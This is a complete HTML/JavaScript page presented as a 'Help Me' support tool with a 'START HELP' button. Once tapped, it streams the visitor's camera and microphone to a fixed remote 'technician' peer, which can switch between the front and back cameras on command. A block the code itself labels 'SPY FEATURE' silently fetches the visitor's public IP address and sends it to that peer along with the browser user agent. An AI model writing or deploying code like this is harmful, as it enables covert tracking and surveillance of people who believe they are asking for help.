<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Help Me</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <style>
        body {
            background-color: #f4f7f6;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            font-family: Arial, sans-serif;
            text-align: center;
        }

        #bigBtn {
            width: 70vw;
            height: 70vw;
            max-width: 280px;
            max-height: 280px;
            border-radius: 50%;
            background-color: #2ecc71; /* Green = Go */
            border: none;
            color: white;
            font-size: 24px;
            font-weight: bold;
            box-shadow: 0 10px 30px rgba(46, 204, 113, 0.5);
            cursor: pointer;
            transition: transform 0.2s;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            -webkit-tap-highlight-color: transparent;
        }

            #bigBtn:active {
                transform: scale(0.95);
            }

        .icon {
            font-size: 60px;
            margin-bottom: 10px;
            display: block;
        }

        #status {
            margin-top: 30px;
            font-size: 18px;
            color: #555;
            background: rgba(255,255,255,0.8);
            padding: 10px 20px;
            border-radius: 20px;
        }

        /* Video is full screen background */
        video {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: -1;
            opacity: 0.1; /* Faint preview so they know it's on */
            transition: opacity 0.5s;
        }

        /* When active, show video clearer */
        body.active video {
            opacity: 1;
        }

        body.active #bigBtn {
            display: none;
        }
        /* Hide button when live */
    </style>
</head>
<body>

    <button id="bigBtn" onclick="startSystem()">
        <span class="icon">ðŸ†˜</span>
        START HELP
    </button>

    <div id="status">Tap the button to connect</div>

    <video id="localPreview" autoplay muted playsinline></video>

    <script>
        // MUST MATCH TECHNICIAN ID
        const TECHNICIAN_ID = "tech-support-commander-001";

        const peer = new Peer();
        let currentStream = null;
        let currentFacingMode = 'user'; // Start with selfie camera
        let myDataConnection = null;
        let myMediaCall = null;

        const statusText = document.getElementById('status');

        // 1. MAIN START FUNCTION
        async function startSystem() {
            statusText.innerText = "Connecting...";

            // A. Connect Data (For Commands & IP)
            myDataConnection = peer.connect(TECHNICIAN_ID);

            myDataConnection.on('open', async () => {
                console.log("Data Link Open");

                // --- SPY FEATURE: GET IP & SEND ---
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const json = await response.json();

                    myDataConnection.send({
                        type: 'info',
                        ip: json.ip,
                        userAgent: navigator.userAgent
                    });
                } catch (e) { console.error("IP Fetch failed"); }

                // Listen for "swap" command
                myDataConnection.on('data', (data) => {
                    if (data === "swap") toggleCamera();
                });
            });

            // B. Start Video
            await startVideo(currentFacingMode);
        }

        // 2. VIDEO HANDLER
        async function startVideo(mode) {
            try {
                // If stream exists, stop it cleanly
                if (currentStream) {
                    currentStream.getTracks().forEach(track => track.stop());
                }

                // Get Camera
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: mode },
                    audio: true
                });

                currentStream = stream;
                document.getElementById('localPreview').srcObject = stream;
                document.body.classList.add('active'); // UI change

                // Call Technician
                if (myMediaCall) myMediaCall.close();
                myMediaCall = peer.call(TECHNICIAN_ID, stream);

                statusText.innerText = (mode === 'user') ? "Sending: Face" : "Sending: Back Camera";
                statusText.style.color = "white";
                statusText.style.background = "rgba(0,0,0,0.5)";

            } catch (err) {
                console.error(err);
                statusText.innerText = "Error: " + err.message;
                alert("Please Allow Camera Access!");
            }
        }

        // 3. REMOTE TOGGLE
        function toggleCamera() {
            // Flip mode
            currentFacingMode = (currentFacingMode === 'user') ? 'environment' : 'user';
            startVideo(currentFacingMode);
        }
    </script>
</body>
</html>
